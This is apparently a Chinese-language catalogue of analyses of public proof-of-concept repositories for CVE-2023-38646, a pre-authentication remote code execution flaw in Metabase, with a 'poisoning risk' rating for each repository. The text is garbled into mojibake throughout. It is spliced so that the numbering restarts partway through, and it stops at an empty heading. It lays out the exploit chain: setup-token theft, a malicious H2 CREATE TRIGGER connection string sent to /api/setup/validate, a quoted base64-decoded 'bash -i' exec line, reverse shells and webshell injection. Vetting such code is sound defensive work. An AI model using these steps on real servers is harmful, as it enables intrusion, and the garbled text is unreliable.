ç»¼ä¸Šæ‰€è¿°ï¼ŒCVE-2023-38646 æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æä¾›çš„ PoC ä»£ç å¯ä»¥æœ‰æ•ˆåˆ©ç”¨è¯¥æ¼æ´ï¼Œä½¿ç”¨è€…åº”è¯¥è°¨æ…å¯¹å¾…ï¼Œé¿å…æ»¥ç”¨ã€‚ä»£ç æœ¬èº«å…·æœ‰è½»å¾®çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦åœ¨äºç¼–ç å’Œå£°æ˜çš„å…è´£å£°æ˜ä¹‹é—´çš„æ½œåœ¨çŸ›ç›¾ã€‚

**é¡¹ç›®åœ°å€:** [UserConnecting/Exploit-CVE-2023-38646-Metabase](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #14

**æ¥æº**: [CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md](../2023/CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®æˆ–å·²å®Œæˆåˆå§‹è®¾ç½®ä½†æœªæ‰§è¡Œåç»­å®‰å…¨åŠ å›ºã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœä»¥åŠæä¾›çš„PoCä»£ç ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚å­˜åœ¨å¤šä¸ªå…¬å¼€çš„PoCï¼Œè¯æ˜è¯¥æ¼æ´å¯ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-POC.py` æ—¨åœ¨è·å– Metabase å®ä¾‹çš„ setup-tokenã€‚å¦‚æœ Metabase å®ä¾‹å¤„äºæœªè®¾ç½®çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ token è¿›è¡Œåˆå§‹åŒ–è®¾ç½®ï¼Œå¹¶è¿›ä¸€æ­¥åˆ©ç”¨å…¶ RCE çš„èƒ½åŠ›ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-Reverse-Shell.py` å¯èƒ½ç”¨äºæ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œå°è¯•è·å–Metabaseçš„ç‰ˆæœ¬ä¿¡æ¯å’Œsetup tokenã€‚

**æŠ•æ¯’é£é™©ï¼š**

PoC ä»£ç  `CVE-2023-38646-POC.py` ä¸»è¦åŠŸèƒ½æ˜¯å‘ç°æœªé…ç½®çš„ Metabase å®ä¾‹å¹¶è·å– setup tokenï¼Œæœ¬èº«æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä½†æ˜¯ï¼Œä¸èƒ½å®Œå…¨æ’é™¤å…¶ä½œè€…åœ¨ä»£ç ä¸­éšè—æ¶æ„ä»£ç çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚åœ¨è·å– token åå°è¯•æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œæˆ–è€…å°† token å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚é£é™©è¯„ä¼°ä¸º 10%ã€‚

PoC ä»£ç  `CVE-2023-38646-Reverse-Shell.py` åŒæ ·æ˜¯æ¼æ´åˆ©ç”¨ç›¸å…³ï¼Œä¸»è¦æ¶‰åŠè·å–setup tokenç­‰ä¿¡æ¯ã€‚éœ€è¦äººå·¥å®¡è®¡è¯¥éƒ¨åˆ†ä»£ç ï¼Œè¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¿¡æ¯æ”¶é›†ï¼š** æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡ Metabase å®ä¾‹çš„ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ã€‚é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹å¯ä»¥è·å– Metabase ç‰ˆæœ¬ã€‚
2.  **è·å–Setup Token (å¦‚æœæœªè®¾ç½®):** å¦‚æœ Metabase å®ä¾‹å°šæœªå®Œæˆåˆå§‹åŒ–è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å– setup-tokenã€‚è¿™ä¸ªtokenå¯ä»¥ç”¨æ¥å®ŒæˆMetabaseçš„åˆå§‹åŒ–ã€‚
3.  **æ‰§è¡Œä»»æ„ä»£ç ï¼š**  åˆ©ç”¨è·å–çš„setup tokenæˆ–è€…å…¶ä»–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…·ä½“ RCE çš„åˆ©ç”¨æ–¹å¼å¯èƒ½æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œä¾‹å¦‚é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„æ•°æ®æºæˆ–ä»ªè¡¨æ¿ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚

æ€»è€Œè¨€ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹ç®€å•ï¼Œå±å®³æ€§æé«˜ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œå…¨æ§åˆ¶å—å½±å“çš„ Metabase æœåŠ¡å™¨ã€‚ 

**é¡¹ç›®åœ°å€:** [XiaomingX/cve-2023-38646-poc](https://github.com/XiaomingX/cve-2023-38646-poc)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #15

**æ¥æº**: [CVE-2023-38646-Zenmovie_CVE-2023-38646.md](../2023/CVE-2023-38646-Zenmovie_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ç‰ˆæœ¬ï¼Œ1.46.6.1ä¹‹å‰Enterpriseç‰ˆæœ¬ï¼Œä»¥åŠå…¶ä»–å—å½±å“çš„å›ºå®šç‰ˆæœ¬ä¹‹å‰çš„ç‰ˆæœ¬

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹å¯ä»æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§å¾ˆé«˜ã€‚

**æœ‰æ•ˆæ€§:**

*   æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æœç´¢å¼•æ“ç»“æœç¡®è®¤äº†è¯¥æ¼æ´çš„ä¸¥é‡æ€§ï¼Œå¹¶æä¾›äº†å¤šä¸ªå…³äºè¯¥æ¼æ´çš„æè¿°ã€å½±å“å’ŒæŠ€æœ¯ç»†èŠ‚çš„ç½‘é¡µé“¾æ¥ï¼ŒåŒ…æ‹¬PoCä»£ç çš„GitHubé“¾æ¥ã€‚
*   æä¾›çš„PoCä»£ç  (`CVE-2023-38646.py`) çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå®ƒåˆ©ç”¨äº† Metabase çš„ `setup-token` å’Œ H2 æ•°æ®åº“çš„ç‰¹æ€§æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **è·å– Setup Token å’Œ Metabase ç‰ˆæœ¬:** PoC é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæ£€ç´¢ `setup-token` å’Œ Metabase ç‰ˆæœ¬ã€‚
2.  **æ„é€  Payload:**  æ„å»ºåå¼¹ shell çš„ payload, å¹¶å¯¹å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚
3.  **æ„é€ Exploitæ•°æ®:** PoC æ„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON æ•°æ®ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ªåˆ©ç”¨ `CREATE TRIGGER` çš„ payloadï¼Œè¯¥è§¦å‘å™¨åœ¨ `INFORMATION_SCHEMA.TABLES` ä¸Šæ‰§è¡Œ `SELECT` æ“ä½œä¹‹å‰æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`token` å­—æ®µæ‹¼æ¥äº† setup token å’Œ base64 ç¼–ç åçš„ payloadã€‚
4.  **å‘é€æ¶æ„è¯·æ±‚:** PoC å‘ `/api/setup/validate` å‘é€å¸¦æœ‰æ„é€ çš„ JSON æ•°æ®çš„ POST è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚ä¼šè§¦å‘ H2 æ•°æ®åº“è¿æ¥å’Œè§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©:**

PoCä»£ç æœ¬èº«çš„åå¼¹shellè¿æ¥åœ°å€æ˜¯å¯ä»¥é…ç½®çš„, å¦‚æœä½œè€…æƒ³æŠ•æ¯’,å¯ä»¥å°†IPåœ°å€å†™æ­»,æˆ–è€…åŠ å…¥å…¶ä»–æ¶æ„æ“ä½œ.
*   æ¼æ´åˆ©ç”¨ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå…¶ç›®çš„æ˜¯æ˜ç¡®çš„ã€‚
*   `README.md` æ–‡ä»¶åªåŒ…å« PoC çš„åŸºæœ¬ä¿¡æ¯ã€‚

å› æ­¤ï¼Œè¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½, å¤§æ¦‚åœ¨10%å·¦å³ã€‚æŠ•æ¯’çš„ä¸»è¦é£é™©åœ¨äºæ¶æ„ä¿®æ”¹payloadï¼Œä¾‹å¦‚åå¼¹shellåœ°å€æˆ–è€…æ’å…¥å…¶ä»–çš„æ¶æ„æ“ä½œã€‚

**é¡¹ç›®åœ°å€:** [Zenmovie/CVE-2023-38646](https://github.com/Zenmovie/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #16

**æ¥æº**: [CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md](../2023/CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md)

# CVE-2023-38646

> ğŸ“¦ è¯¥CVEæœ‰ **27** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md](../2023/CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md)

## CVE-2023-38646 - Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯å…¬å¼€è®¿é—®æˆ–æ”»å‡»è€…ä½äºåŒä¸€ç½‘ç»œ

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—æœåŠ¡å™¨æƒé™ã€‚æ¼æ´å­˜åœ¨äº Metabase 0.46.6.1 ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ 1.46.6.1 ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æ ¹æ®æœç´¢ç»“æœï¼Œå·²ç»æœ‰å…¬å¼€çš„ PoC ä»£ç å¯ç”¨ (ä¾‹å¦‚ï¼Œgithub.com/threatHNTR/CVE-2023-38646)ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åŸºäº Assetnote çš„ä¸€ç¯‡å…³äºè¯¥æ¼æ´åˆ†æçš„æ–‡ç« ã€‚å®ƒé€šè¿‡åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥é…ç½®ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒé€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥ URLï¼Œåœ¨è¿æ¥æ•°æ®åº“æ—¶è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1.  **æ„é€ æ¶æ„ JSON Payload:**  è¯¥ JSON payload ç”¨äºåˆ›å»ºæˆ–ä¿®æ”¹ Metabase ä¸­çš„æ•°æ®åº“è¿æ¥ã€‚ å…¶ä¸­ `classname` è¢«è®¾ç½®ä¸º `org.h2.Driver` , `subname` åŒ…å«æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²,å­—ç¬¦ä¸²åˆ©ç”¨ H2 çš„ `CREATE TRIGGER` ç‰¹æ€§ï¼Œåœ¨INFORMATION_SCHEMA.TABLESä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨, è¯¥è§¦å‘å™¨ä¼šåœ¨æ¯æ¬¡æŸ¥è¯¢è¯¥è¡¨æ—¶æ‰§è¡ŒåµŒå…¥çš„ JavaScript ä»£ç , JavaScriptä»£ç è´Ÿè´£æ‰§è¡Œå‘½ä»¤.
2.  **å‘é€Payload:** é€šè¿‡å‘é€ POST è¯·æ±‚åˆ° Metabase API ç«¯ç‚¹ï¼ˆé€šå¸¸æ˜¯ /api/setup/validate æˆ–å…¶ä»–ç›¸å…³ç«¯ç‚¹ï¼‰ï¼Œå°†æ„é€ çš„ JSON payload å‘é€ç»™ Metabase æœåŠ¡å™¨ã€‚ç”±äºè¯¥æ¼æ´æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå› æ­¤æ— éœ€æä¾›ä»»ä½•èº«ä»½éªŒè¯ä¿¡æ¯ã€‚
3.  **è§¦å‘ RCE:** Metabase æœåŠ¡å™¨å°è¯•ä½¿ç”¨æä¾›çš„é…ç½®è¿æ¥åˆ° H2 æ•°æ®åº“æ—¶ï¼Œæ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ä¼šè¢«è§£æå’Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ PoC çš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¯¥æ¼æ´ã€‚ åˆ†æä»£ç ï¼Œå‘ç°é«˜é£é™©çš„è¡Œä¸ºæ˜¯æ‰§è¡Œ `java.lang.Runtime.getRuntime().exec('bash -c {echo,BASE64COMMAND}|{base64,-d}|{bash,-i}')`ã€‚è¿™è¡Œä»£ç å…è®¸æ‰§è¡Œä»»æ„çš„ bash å‘½ä»¤ã€‚æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **å‘½ä»¤æ³¨å…¥é£é™©ï¼š**  è™½ç„¶ä»£ç ä¸­ä½¿ç”¨äº† Base64 ç¼–ç ï¼Œä½†æ”»å‡»è€…ä»ç„¶å¯èƒ½é€šè¿‡ä¿®æ”¹ Base64 ç¼–ç çš„å†…å®¹æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚
*   **æƒé™æå‡é£é™©ï¼š**  ç”±äºä»£ç ä»¥ Metabase æœåŠ¡å™¨çš„æƒé™è¿è¡Œï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´æå‡æƒé™ã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ä¸»è¦æ¥è‡ªäºå‘½ä»¤æ³¨å…¥çš„å¯èƒ½æ€§ï¼Œä½†è¿™å–å†³äºå¦‚ä½•ä½¿ç”¨å’Œä¿®æ”¹ PoCã€‚æ•´ä½“æŠ•æ¯’å¯èƒ½æ€§è¾ƒä½ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦1%ã€‚å› ä¸ºä½œè€…å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªæ¼æ´çš„æ‰©å±•ï¼Œæ„åœ¨è§£å†³ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„åˆ©ç”¨é—®é¢˜ï¼Œå¹¶ä¸”ä¸»è¦ä»£ç é€»è¾‘æ˜¯åˆ©ç”¨å·²çŸ¥æ¼æ´ï¼Œè€Œä¸æ˜¯å¼•å…¥æ–°çš„ã€éšè”½çš„æ¶æ„ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [0utl4nder/Another-Metabase-RCE-CVE-2023-38646](https://github.com/0utl4nder/Another-Metabase-RCE-CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #2

**æ¥æº**: [CVE-2023-38646-AnvithLobo_CVE-2023-38646.md](../2023/CVE-2023-38646-AnvithLobo_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯é€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œé¢„å…ˆè®¾å®šçš„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **è·å–Tokenï¼š** é¦–å…ˆï¼Œé€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å–ä¸€ä¸ªsetup tokenã€‚
2.  **æ„é€ Payloadï¼š**  ç„¶åï¼Œæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åˆ©ç”¨`CREATE TRIGGER`è¯­å¥åˆ›å»ºè§¦å‘å™¨ï¼Œåœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œå‰è§¦å‘ã€‚è§¦å‘å™¨æ‰§è¡Œçš„JavaScriptä»£ç ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
3.  **Base64ç¼–ç ï¼š** ä½¿ç”¨Base64å¯¹åå‘shellæŒ‡ä»¤è¿›è¡Œç¼–ç ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦å½±å“ã€‚
4.  **å‘é€Payloadï¼š**  æœ€åï¼Œå°†æ„é€ å¥½çš„JSON payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚

**æœ‰æ•ˆæ€§ï¼š**  æä¾›çš„PoCä»£ç æœ‰æ•ˆï¼Œå¯ä»¥æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©ï¼š**  ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å¹¶æ‰§è¡Œåå‘shellã€‚ä½œè€…æä¾›çš„ä»£ç é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ¶æ„ä»£ç ç‰‡æ®µæˆ–è€…éšè—çš„åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½ä¸æè¿°ä¸€è‡´ï¼Œç›®çš„æ˜¯åˆ©ç”¨Metabaseçš„æ¼æ´æ¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œæƒé™ã€‚å› æ­¤, æŠ•æ¯’é£é™©è¯„ä¼°ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [AnvithLobo/CVE-2023-38646](https://github.com/AnvithLobo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #3

**æ¥æº**: [CVE-2023-38646-Boogipop_MetabaseRceTools.md](../2023/CVE-2023-38646-Boogipop_MetabaseRceTools.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1, Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™çº§åˆ«ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼åˆ†æå¦‚ä¸‹ï¼š

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æœªæˆæƒè®¿é—®ï¼š** è¯¥æ¼æ´æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ã€‚
2.  **RCEï¼š**  æ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶çš„è¯·æ±‚ï¼Œæ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„ä»»æ„å‘½ä»¤ã€‚
3.  **å…·ä½“åˆ©ç”¨ï¼š** æ ¹æ®æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ”»å‡»æµç¨‹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š
    *   **éªŒè¯æ¨¡å—ï¼š**  å‘`/api/session/properties`ç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œè·å–æœªæˆæƒçš„tokenï¼Œç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚
    *   **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** åˆ©ç”¨ä¸Šä¸€æ­¥è·å–çš„tokenï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚éœ€è¦æŒ‡å®šmetabase.jarçš„ä½ç½®ã€‚
    *   **å†…å­˜é©¬æ³¨å…¥æ¨¡å—ï¼š** é€šè¿‡ä¿®æ”¹`x-client-data`è¯·æ±‚å¤´æ³¨å…¥å†…å­˜é©¬ï¼Œæ”¯æŒ cmd å’Œ godzilla ä¸¤ç§æ¨¡å¼ã€‚cmdæ¨¡å¼ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œgodzillaæ¨¡å¼åˆ™ç›´æ¥è¿æ¥å“¥æ–¯æ‹‰webshellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

